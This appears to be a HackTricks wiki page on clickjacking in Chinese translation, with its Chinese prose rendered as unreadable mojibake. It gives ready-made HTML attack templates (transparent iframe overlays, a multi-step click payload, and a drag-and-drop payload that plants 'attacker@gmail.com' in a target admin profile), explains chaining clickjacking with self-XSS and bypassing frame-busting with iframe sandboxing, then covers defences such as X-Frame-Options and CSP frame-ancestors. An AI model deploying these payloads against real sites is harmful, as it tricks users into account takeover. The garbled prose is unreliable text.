# Clickjacking

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## ä»€ä¹ˆæ˜¯ Clickjacking

åœ¨ clickjacking æ”»å‡»ä¸­ï¼Œ**ç”¨æˆ·**è¢« **æ¬ºéª—** ç‚¹å‡»ç½‘é¡µä¸Šçš„ä¸€ä¸ª **å…ƒç´ **ï¼Œè¯¥å…ƒç´ è¦ä¹ˆæ˜¯ **ä¸å¯è§** çš„ï¼Œè¦ä¹ˆä¼ªè£…æˆå…¶ä»–å…ƒç´ ã€‚è¿™ç§æ“æ§å¯èƒ½å¯¼è‡´ç”¨æˆ·æ„æƒ³ä¸åˆ°çš„åæœï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„è½¯ä»¶ã€é‡å®šå‘åˆ°æ¶æ„ç½‘é¡µã€æä¾›å‡­æ®æˆ–æ•æ„Ÿä¿¡æ¯ã€èµ„é‡‘è½¬ç§»æˆ–åœ¨çº¿è´­ä¹°äº§å“ã€‚

### é¢„å¡«å……è¡¨å•æŠ€å·§

æœ‰æ—¶å¯ä»¥åœ¨åŠ è½½é¡µé¢æ—¶ä½¿ç”¨ GET å‚æ•° **å¡«å……è¡¨å•å­—æ®µçš„å€¼**ã€‚æ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨è¿™ç§è¡Œä¸ºç”¨ä»»æ„æ•°æ®å¡«å……è¡¨å•å¹¶å‘é€ clickjacking æœ‰æ•ˆè½½è·ï¼Œä»¥ä¾¿ç”¨æˆ·ç‚¹å‡»æäº¤æŒ‰é’®ã€‚

### ä½¿ç”¨æ‹–æ”¾å¡«å……è¡¨å•

å¦‚æœæ‚¨éœ€è¦ç”¨æˆ· **å¡«å†™è¡¨å•**ï¼Œä½†ä¸æƒ³ç›´æ¥è¦æ±‚ä»–å†™ä¸€äº›ç‰¹å®šä¿¡æ¯ï¼ˆä¾‹å¦‚æ‚¨çŸ¥é“çš„ç”µå­é‚®ä»¶æˆ–ç‰¹å®šå¯†ç ï¼‰ï¼Œæ‚¨å¯ä»¥åªè¦æ±‚ä»– **æ‹–æ”¾** ä¸€äº›å°†å†™å…¥æ‚¨æ§åˆ¶æ•°æ®çš„å†…å®¹ï¼Œå¦‚ [**è¿™ä¸ªä¾‹å­**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/) ä¸­æ‰€ç¤ºã€‚

### åŸºæœ¬æœ‰æ•ˆè½½è·
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### å¤šæ­¥éª¤æœ‰æ•ˆè½½è·
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### æ‹–æ”¾ + ç‚¹å‡»æœ‰æ•ˆè½½è·
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

å¦‚æœæ‚¨å·²è¯†åˆ«å‡ºä¸€ä¸ª**éœ€è¦ç”¨æˆ·ç‚¹å‡»**æŸä¸ªå…ƒç´ ä»¥**è§¦å‘**XSSçš„**XSSæ”»å‡»**ï¼Œå¹¶ä¸”è¯¥é¡µé¢**æ˜“å—ç‚¹å‡»åŠ«æŒ**ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨å®ƒæ¥æ¬ºéª—ç”¨æˆ·ç‚¹å‡»æŒ‰é’®/é“¾æ¥ã€‚\
ç¤ºä¾‹ï¼š\
_æ‚¨åœ¨è´¦æˆ·çš„æŸäº›ç§äººä¿¡æ¯ä¸­å‘ç°äº†ä¸€ä¸ª**è‡ªæˆ‘XSS**ï¼ˆè¿™äº›ä¿¡æ¯**åªæœ‰æ‚¨å¯ä»¥è®¾ç½®å’Œè¯»å–**ï¼‰ã€‚åŒ…å«è®¾ç½®è¿™äº›ä¿¡æ¯çš„**è¡¨å•**çš„é¡µé¢**æ˜“å—** **ç‚¹å‡»åŠ«æŒ**ï¼Œæ‚¨å¯ä»¥ç”¨GETå‚æ•°**é¢„å¡«å……**è¯¥**è¡¨å•**ã€‚_\
\_\_æ”»å‡»è€…å¯ä»¥å‡†å¤‡ä¸€ä¸ª**ç‚¹å‡»åŠ«æŒ**æ”»å‡»ï¼Œé€šè¿‡**é¢„å¡«å……**è¯¥é¡µé¢çš„**è¡¨å•**ä¸**XSSæœ‰æ•ˆè½½è·**ï¼Œå¹¶**æ¬ºéª—****ç”¨æˆ·**æäº¤è¯¥è¡¨å•ã€‚å› æ­¤ï¼Œ**å½“è¡¨å•è¢«æäº¤**ä¸”å€¼è¢«ä¿®æ”¹æ—¶ï¼Œ**ç”¨æˆ·å°†æ‰§è¡ŒXSS**ã€‚

## å‡è½»ç‚¹å‡»åŠ«æŒçš„ç­–ç•¥

### å®¢æˆ·ç«¯é˜²å¾¡

åœ¨å®¢æˆ·ç«¯æ‰§è¡Œçš„è„šæœ¬å¯ä»¥é‡‡å–æªæ–½æ¥é˜²æ­¢ç‚¹å‡»åŠ«æŒï¼š

* ç¡®ä¿åº”ç”¨ç¨‹åºçª—å£æ˜¯ä¸»çª—å£æˆ–é¡¶éƒ¨çª—å£ã€‚
* ä½¿æ‰€æœ‰æ¡†æ¶å¯è§ã€‚
* é˜²æ­¢å¯¹ä¸å¯è§æ¡†æ¶çš„ç‚¹å‡»ã€‚
* æ£€æµ‹å¹¶è­¦å‘Šç”¨æˆ·æ½œåœ¨çš„ç‚¹å‡»åŠ«æŒå°è¯•ã€‚

ç„¶è€Œï¼Œè¿™äº›æ¡†æ¶ç ´åè„šæœ¬å¯èƒ½ä¼šè¢«è§„é¿ï¼š

* **æµè§ˆå™¨çš„å®‰å…¨è®¾ç½®ï¼š** ä¸€äº›æµè§ˆå™¨å¯èƒ½ä¼šæ ¹æ®å…¶å®‰å…¨è®¾ç½®æˆ–ç¼ºä¹JavaScriptæ”¯æŒæ¥é˜»æ­¢è¿™äº›è„šæœ¬ã€‚
* **HTML5 iframe `sandbox` å±æ€§ï¼š** æ”»å‡»è€…å¯ä»¥é€šè¿‡è®¾ç½®`sandbox`å±æ€§ä¸º`allow-forms`æˆ–`allow-scripts`å€¼è€Œä¸åŒ…å«`allow-top-navigation`æ¥ä¸­å’Œæ¡†æ¶ç ´åè„šæœ¬ã€‚è¿™ä¼šé˜»æ­¢iframeéªŒè¯å®ƒæ˜¯å¦æ˜¯é¡¶å±‚çª—å£ï¼Œä¾‹å¦‚ï¼Œ
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` å’Œ `allow-scripts` å€¼åœ¨ç¦ç”¨é¡¶çº§å¯¼èˆªçš„åŒæ—¶å¯ç”¨ iframe å†…çš„æ“ä½œã€‚ä¸ºäº†ç¡®ä¿ç›®æ ‡ç«™ç‚¹çš„é¢„æœŸåŠŸèƒ½ï¼Œå¯èƒ½éœ€è¦é¢å¤–çš„æƒé™ï¼Œå¦‚ `allow-same-origin` å’Œ `allow-modals`ï¼Œå…·ä½“å–å†³äºæ”»å‡»ç±»å‹ã€‚æµè§ˆå™¨æ§åˆ¶å°æ¶ˆæ¯å¯ä»¥æŒ‡å¯¼å…è®¸å“ªäº›æƒé™ã€‚

### æœåŠ¡å™¨ç«¯é˜²å¾¡

#### X-Frame-Options

**`X-Frame-Options` HTTP å“åº”å¤´** é€šçŸ¥æµè§ˆå™¨å…³äºåœ¨ `<frame>` æˆ– `<iframe>` ä¸­æ¸²æŸ“é¡µé¢çš„åˆæ³•æ€§ï¼Œæœ‰åŠ©äºé˜²æ­¢ Clickjackingï¼š

* `X-Frame-Options: deny` - æ²¡æœ‰åŸŸå¯ä»¥æ¡†æ¶å†…å®¹ã€‚
* `X-Frame-Options: sameorigin` - åªæœ‰å½“å‰ç«™ç‚¹å¯ä»¥æ¡†æ¶å†…å®¹ã€‚
* `X-Frame-Options: allow-from https://trusted.com` - åªæœ‰æŒ‡å®šçš„ 'uri' å¯ä»¥æ¡†æ¶é¡µé¢ã€‚
* æ³¨æ„é™åˆ¶ï¼šå¦‚æœæµè§ˆå™¨ä¸æ”¯æŒæ­¤æŒ‡ä»¤ï¼Œå¯èƒ½æ— æ³•å·¥ä½œã€‚ä¸€äº›æµè§ˆå™¨æ›´å€¾å‘äº CSP frame-ancestors æŒ‡ä»¤ã€‚

#### å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) frame-ancestors æŒ‡ä»¤

**CSP ä¸­çš„ `frame-ancestors` æŒ‡ä»¤** æ˜¯é˜²æ­¢ Clickjacking çš„å»ºè®®æ–¹æ³•ï¼š

* `frame-ancestors 'none'` - ç±»ä¼¼äº `X-Frame-Options: deny`ã€‚
* `frame-ancestors 'self'` - ç±»ä¼¼äº `X-Frame-Options: sameorigin`ã€‚
* `frame-ancestors trusted.com` - ç±»ä¼¼äº `X-Frame-Options: allow-from`ã€‚

ä¾‹å¦‚ï¼Œä»¥ä¸‹ CSP ä»…å…è®¸æ¥è‡ªåŒä¸€åŸŸçš„æ¡†æ¶ï¼š

`Content-Security-Policy: frame-ancestors 'self';`

æ›´å¤šè¯¦ç»†ä¿¡æ¯å’Œå¤æ‚ç¤ºä¾‹å¯ä»¥åœ¨ [frame-ancestors CSP æ–‡æ¡£](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) å’Œ [Mozilla çš„ CSP frame-ancestors æ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) ä¸­æ‰¾åˆ°ã€‚

### å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) ä¸ `child-src` å’Œ `frame-src`

**å†…å®¹å®‰å…¨ç­–ç•¥ (CSP)** æ˜¯ä¸€ç§å®‰å…¨æªæ–½ï¼Œé€šè¿‡æŒ‡å®šæµè§ˆå™¨åº”å…è®¸åŠ è½½å†…å®¹çš„æ¥æºï¼Œå¸®åŠ©é˜²æ­¢ Clickjacking å’Œå…¶ä»–ä»£ç æ³¨å…¥æ”»å‡»ã€‚

#### `frame-src` æŒ‡ä»¤

* å®šä¹‰æ¡†æ¶çš„æœ‰æ•ˆæ¥æºã€‚
* æ¯” `default-src` æŒ‡ä»¤æ›´å…·ä½“ã€‚
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
æ­¤ç­–ç•¥å…è®¸æ¥è‡ªç›¸åŒæºï¼ˆselfï¼‰å’Œ https://trusted-website.com çš„æ¡†æ¶ã€‚

#### `child-src` æŒ‡ä»¤

* åœ¨ CSP çº§åˆ« 2 ä¸­å¼•å…¥ï¼Œç”¨äºè®¾ç½® web workers å’Œæ¡†æ¶çš„æœ‰æ•ˆæ¥æºã€‚
* ä½œä¸º frame-src å’Œ worker-src çš„åå¤‡ã€‚
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
æ­¤ç­–ç•¥å…è®¸æ¥è‡ªç›¸åŒæ¥æºï¼ˆselfï¼‰å’Œ https://trusted-website.com çš„æ¡†æ¶å’Œå·¥ä½œè€…ã€‚

**ä½¿ç”¨è¯´æ˜ï¼š**

* åºŸå¼ƒï¼šchild-src æ­£åœ¨é€æ­¥è¢« frame-src å’Œ worker-src å–ä»£ã€‚
* å›é€€è¡Œä¸ºï¼šå¦‚æœ frame-src ç¼ºå¤±ï¼Œåˆ™ä½¿ç”¨ child-src ä½œä¸ºæ¡†æ¶çš„å›é€€ã€‚å¦‚æœä¸¤è€…éƒ½ç¼ºå¤±ï¼Œåˆ™ä½¿ç”¨ default-srcã€‚
* ä¸¥æ ¼çš„æºå®šä¹‰ï¼šåœ¨æŒ‡ä»¤ä¸­ä»…åŒ…å«å—ä¿¡ä»»çš„æºä»¥é˜²æ­¢åˆ©ç”¨ã€‚

#### JavaScript æ¡†æ¶ç ´åè„šæœ¬

å°½ç®¡å¹¶éå®Œå…¨å¯é ï¼Œä½†åŸºäº JavaScript çš„æ¡†æ¶ç ´åè„šæœ¬å¯ä»¥ç”¨äºé˜²æ­¢ç½‘é¡µè¢«æ¡†æ¶åŒ–ã€‚ç¤ºä¾‹ï¼š
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### ä½¿ç”¨å-CSRFä»¤ç‰Œ

* **ä»¤ç‰ŒéªŒè¯ï¼š** åœ¨Webåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨å-CSRFä»¤ç‰Œï¼Œä»¥ç¡®ä¿çŠ¶æ€æ›´æ”¹è¯·æ±‚æ˜¯ç”¨æˆ·æœ‰æ„å‘å‡ºçš„ï¼Œè€Œä¸æ˜¯é€šè¿‡Clickjackedé¡µé¢å‘å‡ºçš„ã€‚

## å‚è€ƒæ–‡çŒ®

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
